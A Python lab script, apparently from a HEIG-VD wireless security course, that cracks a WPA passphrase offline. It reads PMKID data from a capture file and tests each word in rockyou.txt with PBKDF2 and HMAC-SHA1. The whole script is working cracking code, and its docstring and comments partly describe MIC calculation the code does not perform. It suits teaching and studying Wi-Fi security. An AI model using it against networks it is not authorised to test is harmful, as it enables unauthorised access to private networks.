#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- Derive WPA keys from Passphrase and 4-way handshake info

- Calculate an authentication MIC (the mic for data transmission uses the
Michael algorithm. In the case of authentication, we use SHA-1 or MD5)
"""

__author__ = "Abraham Rubinstein"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib

from scapy.layers.eap import EAPOL

# Set to true to skip most of the wrong passphrases
# (Highly recomended, as the passphrase is at possition 90005)
DEBUG = True


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
dictionary = "rockyou.txt"  # this is the dictionary containing all words to test
A = b"PMK Name"  # this string is used in the pseudo-random function
ssid = wpa[0].info  # SWI
APmac = a2b_hex(wpa[145].addr2.replace(':', ''))
Clientmac = a2b_hex(wpa[145].addr1.replace(':', ''))
PMKID = b2a_hex(wpa[145].load[-16:]).decode('utf-8')

PMK_MSG = A + APmac + Clientmac

print("\n\nValues used to derivate keys")
print("============================")
print("Dictionary file : ", dictionary, "\n")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("PMKID: ", PMKID, "\n")
print("PMK msg: ", b2a_hex(PMK_MSG), "\n")

for i, passPhrase in enumerate(open(dictionary)):
    passPhrase = passPhrase.strip('\n')

    if i % 100 == 0:
        print("words attempted : %d, current word : \"%s\"" % (i, passPhrase))
    if i < 90000 and DEBUG:
        continue
    elif i > 90010 and DEBUG:
        exit()

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)

    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK (support for SHA1 and MD5)
    pmkid_generated = hmac.new(pmk, PMK_MSG, hashlib.sha1)

    # if the computed MIC matches the given MIC, we're done, otherwise, we loop again
    if pmkid_generated.hexdigest()[:6 * 2] != PMKID[:6 * 2]:
        continue
    print("FOUND A KEY : \"%s\"" % (passPhrase))

    exit(0)
